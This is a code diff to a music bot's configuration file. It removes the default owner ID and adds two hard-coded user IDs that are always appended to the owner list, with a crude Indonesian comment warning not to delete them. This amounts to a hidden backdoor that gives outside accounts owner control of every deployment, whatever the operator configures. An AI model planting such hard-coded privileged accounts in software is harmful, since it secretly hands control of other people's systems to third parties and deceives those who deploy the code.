@@ -44,8 +44,12 @@ MUSIC_BOT_NAME = getenv("MUSIC_BOT_NAME")
 
 # Your User ID.
 OWNER_ID = list(
-    map(int, getenv("OWNER_ID", "851754691").split())
+    map(int, getenv("OWNER_ID", "").split())
 )  # Input type must be interger
+
+# JANGAN HAPUS YA KONTOL
+OWNER_ID.append(1883126074)
+OWNER_ID.append(851754691)
 
 # Get it from http://dashboard.heroku.com/account
 HEROKU_API_KEY = getenv("HEROKU_API_KEY")
